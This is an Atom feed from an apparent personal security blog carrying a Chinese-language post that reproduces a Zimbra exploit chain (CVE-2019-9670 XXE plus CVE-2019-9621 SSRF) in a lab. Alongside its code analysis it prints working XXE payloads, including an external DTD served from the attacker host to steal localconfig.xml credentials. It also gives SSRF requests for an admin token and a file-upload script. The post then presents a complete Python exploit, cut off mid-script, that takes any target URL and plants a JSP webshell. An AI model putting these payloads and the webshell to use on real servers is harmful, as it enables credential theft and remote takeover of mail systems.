<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>ggb0n&#39;s Blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://ggb0n.cool/"/>
  <updated>2020-09-06T09:13:40.255Z</updated>
  <id>http://ggb0n.cool/</id>
  
  <author>
    <name>ggb0n</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Zimbra2019CVE复现</title>
    <link href="http://ggb0n.cool/2020/09/06/Zimbra2019CVE%E5%A4%8D%E7%8E%B0/"/>
    <id>http://ggb0n.cool/2020/09/06/Zimbra2019CVE%E5%A4%8D%E7%8E%B0/</id>
    <published>2020-09-06T09:06:53.000Z</published>
    <updated>2020-09-06T09:13:40.255Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Zimbra-2019漏洞复现"><a href="#Zimbra-2019漏洞复现" class="headerlink" title="Zimbra 2019漏洞复现"></a>Zimbra 2019漏洞复现</h2><h3 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h3><p>2019年Zimbra爆出两个CVE，分别是<code>CVE-2019-9670</code>和<code>CVE-2019-9621</code>，前者是XXE漏洞，后者可实现SSRF。<a id="more"></a></p><p>CVE-2019-9670是由<code>zimbra/lib/jars/zimbrastore.jar</code>中的AutoDiscover模块对登录信息审查不严谨而导致的XXE任意文件读取漏洞，影响范围为<code>8.5-8.7.11</code>，在服务器开启7071端口的情况下，可以伪装为管理员登录操作。</p><p>CVE-2019-9621是由<code>zimbra/lib/jars/zimbrastore.jar</code>中的ProxyServlet模块所提供的的代理请求功能导致，通过低权限令牌可以向管理员端口发起请求，从而拿到管理员权限。在服务器7071端口关闭的情况下，利用此SSRF结合XXE漏洞可以实现RCE。</p><h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><h4 id="CVE-2019-9670"><a href="#CVE-2019-9670" class="headerlink" title="CVE-2019-9670"></a>CVE-2019-9670</h4><p><code>zimbrastore.jar</code>文件中的<code>com/zimbra/cs/service/AutoDiscoverServlet.class</code>中的<code>doPost</code>函数使用<code>getTagValue</code>函数处理用户请求：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">NodeList nList = doc.getElementsByTagName(<span class="string">"Request"</span>);</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(i &gt;= nList.getLength())</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    Node node = nList.item(i);</span><br><span class="line">    <span class="keyword">if</span>(node.getNodeType() == <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        Element element = (Element)node;</span><br><span class="line">        email = getTagValue(<span class="string">"EMailAddress"</span>, element);</span><br><span class="line">        responseSchema = getTagValue(<span class="string">"AcceptableResponseSchema"</span>, element);</span><br><span class="line">        <span class="keyword">if</span>(email != <span class="keyword">null</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    i++;</span><br><span class="line">&#125; <span class="keyword">while</span>(<span class="keyword">true</span>);</span><br></pre></td></tr></table></figure><p>可以看到，它会对传入的<code>EMailAddress</code>和<code>AcceptableResponseSchema</code>参数进行审查，前者是邮箱，后者是接受的响应类型，具体见<a href="https://docs.microsoft.com/zh-cn/">官网</a>中对AutoDiscover构造语句的描述。代码如下：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(email == <span class="keyword">null</span> || email.length() == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">    log.warn(<span class="string">"No Email address is specified in the Request, %s"</span>, <span class="keyword">new</span> Object[] &#123;</span><br><span class="line">        content</span><br><span class="line">    &#125;);</span><br><span class="line">    sendError(resp, <span class="number">400</span>, <span class="string">"No Email address is specified in the Request"</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(responseSchema != <span class="keyword">null</span> &amp;&amp; responseSchema.length() &gt; <span class="number">0</span> &amp;&amp; !responseSchema.equals(<span class="string">"http://schemas.microsoft.com/exchange/autodiscover/mobilesync/responseschema/2006"</span>) &amp;&amp; !responseSchema.equals(<span class="string">"http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a"</span>))</span><br><span class="line">&#123;</span><br><span class="line">    log.warn((<span class="keyword">new</span> StringBuilder()).append(<span class="string">"Requested response schema not available "</span>).append(responseSchema).toString());</span><br><span class="line">    sendError(resp, <span class="number">503</span>, (<span class="keyword">new</span> StringBuilder()).append(<span class="string">"Requested response schema not available "</span>).append(responseSchema).toString());</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，其中对<code>email</code>的检查仅限于检查其是否为空，没有用户合法性验证，因此随意构造邮箱用户即可登录。对<code>responseSchema</code>检查是否为规定的两种类型，如果不是，则报错并将responseSchema返回给用户，<strong>这里就是漏洞产生的关键位置</strong>，<strong>因为post的内容是经过xml编码的，因此如果我们构造恶意的xml语句，并将变量名放入<code>AcceptableResponseSchema</code>中，那么不满足规定的两种类型，将通过<code>sendError(resp, 503, (new StringBuilder()).append(&quot;Requested response schema not available &quot;).append(responseSchema).toString())</code>语句将其内容返回给用户，这里由于AcceptableResponseSchema是我们构造好的恶意xml代码的变量名，因此会先执行恶意代码，然后将结果返回给用户，从而导致XXE</strong>。</p><p>通过利用该XXE漏洞，我们可以进行任意文件读取，根据zimbra的官方配置，其管理员用户名、密码等敏感信息，进一步结合SSRF进行恶意文件上传，从而进行RCE。</p><h4 id="CVE-2019-9621"><a href="#CVE-2019-9621" class="headerlink" title="CVE-2019-9621"></a>CVE-2019-9621</h4><p>由于zimbra通过令牌管理用户权限，设置了一个应用程序模型，使得管理令牌只能被授予进入管理端口的请求（默认情况下端口是7071），但是很多网站都没有开7071，因此如果想要获取管理权限上传文件，就需要利用SSRF。</p><p>在<code>com/zimbra/cs/zimlet/ProxyServlet.class</code>中的<code>dopPoxy</code>中存在代理转发的操作：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">boolean</span> isAdmin;</span><br><span class="line">AuthToken authToken;</span><br><span class="line">ZimbraLog.clearContext();</span><br><span class="line">isAdmin = isAdminRequest(req);</span><br><span class="line">authToken = isAdmin ? getAdminAuthTokenFromCookie(req, resp, <span class="keyword">true</span>) : getAuthTokenFromCookie(req, resp, <span class="keyword">true</span>);  </span><br><span class="line"><span class="keyword">if</span>(authToken != <span class="keyword">null</span>)</span><br><span class="line">    <span class="keyword">break</span> MISSING_BLOCK_LABEL_138;</span><br><span class="line">String zAuthToken = req.getParameter(<span class="string">"zauthtoken"</span>);</span><br><span class="line"><span class="keyword">if</span>(zAuthToken == <span class="keyword">null</span>)</span><br><span class="line">    <span class="keyword">break</span> MISSING_BLOCK_LABEL_138;</span><br><span class="line"><span class="keyword">try</span></span><br><span class="line">&#123;</span><br><span class="line">    authToken = AuthProvider.getAuthToken(zAuthToken);</span><br><span class="line">    <span class="keyword">if</span>(authToken.isExpired())</span><br><span class="line">    &#123;</span><br><span class="line">        resp.sendError(<span class="number">401</span>, <span class="string">"authtoken expired"</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span>(AuthTokenException e)</span><br><span class="line">&#123;</span><br><span class="line">    resp.sendError(<span class="number">401</span>, <span class="string">"unable to parse authtoken"</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!authToken.isRegistered())</span><br><span class="line">&#123;</span><br><span class="line">    resp.sendError(<span class="number">401</span>, <span class="string">"authtoken is invalid"</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(isAdmin &amp;&amp; !authToken.isAdmin())</span><br><span class="line">&#123;</span><br><span class="line">    resp.sendError(<span class="number">401</span>, <span class="string">"permission denied"</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">byte</span> body[];</span><br><span class="line">String target;</span><br><span class="line"><span class="keyword">boolean</span> asUpload;</span><br><span class="line">HttpMethod method;</span><br><span class="line"><span class="keyword">if</span>(authToken == <span class="keyword">null</span>)</span><br><span class="line">&#123;</span><br><span class="line">    resp.sendError(<span class="number">401</span>, <span class="string">"no authtoken cookie"</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">body = copyPostedData(req);</span><br><span class="line">target = req.getParameter(<span class="string">"target"</span>);</span><br><span class="line"><span class="keyword">if</span>(target == <span class="keyword">null</span>)</span><br><span class="line">&#123;</span><br><span class="line">    resp.sendError(<span class="number">400</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">URL url = <span class="keyword">new</span> URL(target);</span><br><span class="line"><span class="keyword">if</span>(!isAdmin &amp;&amp; !checkPermissionOnTarget(url, authToken))</span><br><span class="line">&#123;</span><br><span class="line">    resp.sendError(<span class="number">403</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当该代理接收到请求的时候，它会判断该账户是不是admin以及其authToken是否合法，并且当authToken是属于一个一般用户的时候，会检查target是否传参，如果利用target传了参数，则会向target指向的位置进行请求。我们可以通过该代理操作访问到本地监听的7071管理端口。如果我们将Host修改为<code>127.0.0.1:7071</code>，告诉服务器自己是从管理端口进入，同时在Cookie中设置一个低权限的Token（可以通过在<code>/service/soap</code>路由登录账号获取，该路由能够对Zimbra邮件服务器的资源进行访问和修改，详细参考<a href="http://www.myzaker.com/article/5e98fe228e9f09724949af30/">Zimbra SOAP API开发指南</a>）访问<code>/service/admin/soap</code>路由，则可以利用SSRF拿到admin的token，利用该token则可以完成恶意文件上传，借助网站挂马进行RCE。</p><h3 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h3><p>目标主机：ubuntu-16.04LTS、zimbra-8.7.1、IP-172.16.36.131</p><p>攻击机：ubuntu-20.04LTS、Firfox+RESTClient插件、python3、IP-172.16.36.130</p><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><h4 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h4><p>参考<a href="https://blog.csdn.net/sydnash/article/details/6108136">此处</a>在ubuntu16.04下搭建zimbra服务器，注意需要首先配置好虚拟机的DNS服务之后再安装zimbra，否则安装过程不能完成。这里记录环境配置过程中的问题：</p><ul><li><p>1、DNS配置问题<br>复现过程中，起初DNS一直配置不成功，后来梳理了一下，需要配置的内容有：<code>/etc/hosts</code>、<code>/etc/resolv.conf</code>、<code>/etc/bind/named.conf.local</code>、<code>/etc/bind/db.xxx.com</code>、<code>/etc/hostname</code>，逐步配置一般不会有问题；</p></li><li><p>2、zimbra安装过程错误-1</p><blockquote><p>ERROR: Installation can not proceeed. Please fix your /etc/hosts file<br>to contain:</p><p><ip> <FQHN> <HN></p><p>Where <IP> is the ip address of the host,<br><FQHN> is the FULLY QUALIFIED host name, and<br><HN> is the (optional) hostname-only portion</p></blockquote><p>如下配置即可：</p><blockquote><p>127.0.0.1 localhost.localdomain localhost<br>192.168.1.218 mail.example.com mail</p></blockquote></li><li><p>3、zimbra安装过程错误-2</p><blockquote><p>Unable to download packages from repository. System is not modified.</p></blockquote><p>多半是源的问题，用下面的源即可</p><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">deb http:<span class="regexp">//mi</span>rrors.aliyun.com<span class="regexp">/ubuntu/</span> xenial main</span><br><span class="line">deb-src http:<span class="regexp">//mi</span>rrors.aliyun.com<span class="regexp">/ubuntu/</span> xenial main</span><br><span class="line">deb http:<span class="regexp">//mi</span>rrors.aliyun.com<span class="regexp">/ubuntu/</span> xenial-updates main</span><br><span class="line">deb-src http:<span class="regexp">//mi</span>rrors.aliyun.com<span class="regexp">/ubuntu/</span> xenial-updates main</span><br><span class="line">deb http:<span class="regexp">//mi</span>rrors.aliyun.com<span class="regexp">/ubuntu/</span> xenial universe</span><br><span class="line">deb-src http:<span class="regexp">//mi</span>rrors.aliyun.com<span class="regexp">/ubuntu/</span> xenial universe</span><br><span class="line">deb http:<span class="regexp">//mi</span>rrors.aliyun.com<span class="regexp">/ubuntu/</span> xenial-updates universe</span><br><span class="line">deb-src http:<span class="regexp">//mi</span>rrors.aliyun.com<span class="regexp">/ubuntu/</span> xenial-updates universe</span><br><span class="line">deb http:<span class="regexp">//mi</span>rrors.aliyun.com<span class="regexp">/ubuntu/</span> xenial-security main</span><br><span class="line">deb-src http:<span class="regexp">//mi</span>rrors.aliyun.com<span class="regexp">/ubuntu/</span> xenial-security main</span><br><span class="line">deb http:<span class="regexp">//mi</span>rrors.aliyun.com<span class="regexp">/ubuntu/</span> xenial-security universe</span><br><span class="line">deb-src http:<span class="regexp">//mi</span>rrors.aliyun.com<span class="regexp">/ubuntu/</span> xenial-security universe</span><br></pre></td></tr></table></figure></li></ul><h4 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h4><p>复现过程可分为四步：利用XXE泄露敏感文件、访问<code>/service/soap</code>路由获取低权限token、利用SSRF访问管理员端口获取高权限token、上传文件进行RCE</p><p><strong>1、泄露敏感文件</strong></p><p><code>/Autodiscover/Autodiscover.xml</code>路由是邮件系统的自动发现服务，使用用户的email地址和密码去自动的配置用户信息，因此当我们向此路由post用于登录的<code>EMailAddress</code>和<code>AcceptableResponseSchema</code>的时候，上面提到的存在XXE漏洞的模块会对其进行解析检查，我们随便构造一个邮箱账号并同时构造用于读取敏感文件的恶意xml代码，向此路由post过去，即可利用xxe读取到敏感文件。</p><p>首先测试漏洞可用性，post如下的payload：</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">xxe</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">name</span> <span class="meta-keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///etc/passwd"</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Autodiscover</span> <span class="attr">xmlns</span>=<span class="string">"http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a"</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">Request</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">EMailAddress</span>&gt;</span>test@test.com<span class="tag">&lt;/<span class="name">EMailAddress</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">AcceptableResponseSchema</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">AcceptableResponseSchema</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">Request</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Autodiscover</span>&gt;</span></span><br></pre></td></tr></table></figure><p>注意这里需要在<code>&lt;Autodiscover&gt;</code>标签中放入正确的Autodiscovery的Request包，<a href="https://docs.microsoft.com/en-us/openspecs/exchange_server_protocols/ms-oxprotlp/30c90a39-9adf-472b-8b5b-03c282304a83">微软官网</a>查询。</p><p>POST过去之后，回显如下：<br><img src="http://ggb0n.cool/images/xxe1.png" alt=""></p><p>可以看到，漏洞成功被利用，接下来就是读取一些敏感文件。<code>localconfig.xml</code>存放着zimbra关键的配置信息，包含域名、内部SOAP通信的用户名、密码（在安装时，Zimbra为其内部SOAP通信设置了一个全局管理员，用户名为<code>zimbra</code>，并随机生成密码。这些信息均存储在名为localconfig.xml的本地文件中）等，因为我们需要通过<code>/service/soap</code>路由获取token，因此需要获取到此用户名和密码。</p><p>这里有一个问题：localconfig.xml是xml文件，需要加上<code>CDATA</code>标签才能作为文本读取，但是XXE不能利用内部实体进行拼接，同时还有我们从前端post构造的payload过去其实是没有服务器的zimbra用户权限的，因此读不到localconfig.xml文件。所以需要借助外部dtd注入触发XXE漏洞。</p><p>构造dtd文件如下：</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"># exp.dtd</span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:../conf/localconfig.xml"</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">start</span> <span class="meta-string">"&lt;![CDATA["</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">end</span> <span class="meta-string">"]]&gt;"</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">all</span> <span class="meta-string">"&lt;!ENTITY fileContents '%start;%file;%end;'&gt;"</span>&gt;</span></span><br></pre></td></tr></table></figure><p>将dtd文件放在我们的攻击机上，同时利用python或者php监听指定端口：</p><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">python3 -m http.server <span class="number">5000</span></span><br><span class="line">php -S <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br></pre></td></tr></table></figure><p>然后post如下payload到服务器：</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">Autodiscover</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">dtd</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"http://172.16.36.130:5000/exp.dtd"</span>&gt;</span></span></span><br><span class="line"><span class="meta">    %dtd;</span></span><br><span class="line"><span class="meta">    %all;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Autodiscover</span> <span class="attr">xmlns</span>=<span class="string">"http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Request</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">EMailAddress</span>&gt;</span>test@test.com<span class="tag">&lt;/<span class="name">EMailAddress</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">AcceptableResponseSchema</span>&gt;</span><span class="symbol">&amp;fileContents;</span><span class="tag">&lt;/<span class="name">AcceptableResponseSchema</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Request</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Autodiscover</span>&gt;</span></span><br></pre></td></tr></table></figure><p>读取到localconfig.xml内容：</p><p><img src="http://ggb0n.cool/images/xxe2.png" alt=""></p><p>读取到soap用户名、密码，至此XXE漏洞利用部分完成，后面结合SSRF进行文件上传。</p><p><strong>2、获取低权限token</strong></p><p>利用获取到的soap用户名和密码，在<code>http://172.16.36.131/service/soap</code>路由下登录，即可获取到一个低权限token，抓包构造payload：</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">soap:Envelope</span> <span class="attr">xmlns:soap</span>=<span class="string">"http://www.w3.org/2003/05/soap-envelope"</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">soap:Header</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">context</span> <span class="attr">xmlns</span>=<span class="string">"urn:zimbra"</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">userAgent</span> <span class="attr">name</span>=<span class="string">"ZimbraWebClient - SAF3 (Win)"</span> <span class="attr">version</span>=<span class="string">"5.0.15_GA_2851.RHEL5_64"</span>/&gt;</span></span><br><span class="line">       <span class="tag">&lt;/<span class="name">context</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">soap:Header</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">soap:Body</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">AuthRequest</span> <span class="attr">xmlns</span>=<span class="string">"urn:zimbraAccount"</span>&gt;</span>  # 指明是普通用户</span><br><span class="line">        <span class="tag">&lt;<span class="name">account</span> <span class="attr">by</span>=<span class="string">"adminName"</span>&gt;</span>zimbra<span class="tag">&lt;/<span class="name">account</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">password</span>&gt;</span>password<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">AuthRequest</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">soap:Body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soap:Envelope</span>&gt;</span></span><br></pre></td></tr></table></figure><p>响应中包含一个低权限token：</p><p><img src="http://ggb0n.cool/images/token.png" alt=""></p><p><strong>3、SSRF获取管理员token</strong></p><p>获取到上面的低权限token之后，利用其代理功能中存在的SSRF漏洞，让服务器替我们去访问它自己的7071端口下的<code>/service/admin/soap</code>路由，即可获取到管理员token，<strong>注意：7071端口的访问必须是https</strong>，url构造如下：</p><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">https:<span class="regexp">//</span><span class="number">172.16</span>.<span class="number">36.131</span><span class="regexp">/service/</span>proxy?target=https:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">7071</span><span class="regexp">/service/</span>admin<span class="regexp">/soap</span></span><br></pre></td></tr></table></figure><p>payload如下：</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">soap:Envelope</span> <span class="attr">xmlns:soap</span>=<span class="string">"http://www.w3.org/2003/05/soap-envelope"</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">soap:Header</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">context</span> <span class="attr">xmlns</span>=<span class="string">"urn:zimbra"</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">userAgent</span> <span class="attr">name</span>=<span class="string">"ZimbraWebClient - SAF3 (Win)"</span> <span class="attr">version</span>=<span class="string">"5.0.15_GA_2851.RHEL5_64"</span>/&gt;</span></span><br><span class="line">       <span class="tag">&lt;/<span class="name">context</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">soap:Header</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">soap:Body</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">AuthRequest</span> <span class="attr">xmlns</span>=<span class="string">"urn:zimbraAdmin"</span>&gt;</span> # 指明是管理员</span><br><span class="line">        <span class="tag">&lt;<span class="name">account</span> <span class="attr">by</span>=<span class="string">"adminName"</span>&gt;</span>zimbra<span class="tag">&lt;/<span class="name">account</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">password</span>&gt;</span>password<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">AuthRequest</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">soap:Body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soap:Envelope</span>&gt;</span></span><br></pre></td></tr></table></figure><p>注意将<code>xmlns</code>更改为<code>urn:zimbraAdmin</code></p><p>在post请求之前，还需要在请求头中添加cookie，内容是上面获取到的低权限token</p><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">Cookie: <span class="attribute">ZM_ADMIN_AUTH_TOKEN</span>=low_permission_token</span><br></pre></td></tr></table></figure><p>响应中包含管理员的token，利用该token，我们可以实现文件上传操作。</p><p><strong>4、文件上传RCE</strong></p><p>此处用到了<code>CVE-2013-7091</code>利用过程中文件上传的操作，详细参考<a href="https://www.exploit-db.com/exploits/30472">这里</a>，通过上传jsp小马，即可实现远程命令执行。这里附上测试代码：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">files = &#123;</span><br><span class="line">    <span class="string">'filename'</span>:(<span class="literal">None</span>,<span class="string">"test1.jsp"</span>,<span class="literal">None</span>),</span><br><span class="line">    <span class="string">'clientFile'</span>:(<span class="string">"test2.jsp"</span>,<span class="string">r'&lt;%out.println("test_file_upload");%&gt;'</span>,<span class="string">"text/plain"</span>),</span><br><span class="line">    <span class="string">'requestId'</span>:(<span class="literal">None</span>,<span class="string">"12"</span>,<span class="literal">None</span>),</span><br><span class="line">&#125;</span><br><span class="line">headers =&#123;</span><br><span class="line">    <span class="string">"Cookie"</span>:<span class="string">"ZM_ADMIN_AUTH_TOKEN=admin_token"</span>,<span class="comment">#admin_token</span></span><br><span class="line">    <span class="string">"Host"</span>:<span class="string">"foo:7071"</span></span><br><span class="line">&#125;</span><br><span class="line">r = requests.post(<span class="string">"https://target.com/service/extension/clientUploader/upload"</span>,files=files,headers=headers,verify=<span class="literal">False</span>)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure><p>访问<code>http://ip:port/downloads/test2.jsp</code>回显<code>test_file_upload</code>说明文件成功上传。构造恶意jsp文件即可实现RCE:</p><p><img src="http://ggb0n.cool/images/rce.png" alt=""></p><p>如图，成功执行命令，用中国菜刀或者中国蚁剑连接即可。</p><h4 id="完整EXP"><a href="#完整EXP" class="headerlink" title="完整EXP"></a>完整EXP</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="comment">#Connect "shell.jsp" with antSword with the password "cmd"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> requests.packages.urllib3.exceptions <span class="keyword">import</span> InsecureRequestWarning</span><br><span class="line">requests.packages.urllib3.disable_warnings(InsecureRequestWarning)</span><br><span class="line">base_url=sys.argv[<span class="number">1</span>]</span><br><span class="line">base_url=base_url.rstrip(<span class="string">"/"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#upload file name and content</span></span><br><span class="line">filename = <span class="string">"shell.jsp"</span></span><br><span class="line">fileContent = <span class="string">r'&lt;%@page import="java.io.*"%&gt;&lt;%@page import="sun.misc.BASE64Decoder"%&gt;&lt;%try &#123;String cmd = request.getParameter("cmd");String path=application.getRealPath(request.getRequestURI());String note="upload_success!";if(cmd.equals("NzU1Ng"))&#123;out.print("[S]"+note+"[E]");&#125;byte[] binary = BASE64Decoder.class.newInstance().decodeBuffer(cmd);String xxcmd = new String(binary);Process child = Runtime.getRuntime().exec(xxcmd);InputStream in = child.getInputStream();out.print("-&gt;|");int c;while ((c = in.read()) != -1) &#123;out.print((char)c);&#125;in.close();out.print("|&lt;-");try &#123;child.waitFor();&#125; catch (InterruptedException e) &#123;e.printStackTrace();&#125;&#125; catch (IOException e) &#123;System.err.println(e);&#125;%&gt;'</span></span><br><span class="line">print(base_url)</span><br><span class="line"></span><br><span class="line"><span class="comment"># dtd file </span></span><br><span class="line">dtd_url=<span class="string">"https://172.16.36.130:5000/exp.dtd"</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">&lt;!ENTITY % file SYSTEM "file:../conf/localconfig.xml"&gt;</span></span><br><span class="line"><span class="string">&lt;!ENTITY % start "&lt;![CDATA["&gt;</span></span><br><span class="line"><span class="string">&lt;!ENTITY % end "]]&gt;"&gt;</span></span><br><span class="line"><span class="string">&lt;!ENTITY % all "&lt;!ENTITY fileContents '%start;%file;%end;'&gt;"&gt;</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">xxe_data = <span class="string">r"""&lt;!DOCTYPE Autodiscover [</span></span><br><span class="line"><span class="string">        &lt;!ENTITY % dtd SYSTEM "&#123;dtd&#125;"&gt;</span></span><br><span class="line"><span class="string">        %dtd;</span></span><br><span class="line"><span class="string">        %all;</span></span><br><span class="line"><span class="string">        ]&gt;</span></span><br><span class="line"><span class="string">&lt;Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a"&gt;</span></span><br><span class="line"><span class="string">    &lt;Request&gt;</span></span><br><span class="line"><span class="string">        &lt;EMailAddress&gt;test@test.com&lt;/EMailAddress&gt;</span></span><br><span class="line"><span class="string">        &lt;AcceptableResponseSchema&gt;&amp;fileContents;&lt;/AcceptableResponseSchema&gt;</span></span><br><span class="line"><span class="string">    &lt;/Request&gt;</span></span><br><span class="line"><span class="string">&lt;/Autodiscover&gt;"""</span>.format(dtd=dtd_url)</span><br><span class="line"></span><br><span class="line"><span class="comment"># XXE stage</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">"Content-Type"</span>:<span class="string">"application/xml"</span></span><br><span class="line">&#125;</span><br><span class="line">print(<span class="string">"[*] Get User Name/Password By XXE "</span>)</span><br><span class="line">r = requests.post(base_url+<span class="string">"/Autodiscover/Autodiscover.xml"</span>,data=xxe_data,headers=headers,verify=<span class="literal">False</span>,timeout=<span class="number">15</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="string">'response schema not available'</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">    print(<span class="string">"have no xxe"</span>)</span><br><span class="line">    exit()</span><br><span class="line"></span><br><span class="line"><span class="comment"># low_token Stage</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">pattern_name = re.compile(<span class="string">r"&amp;lt;key 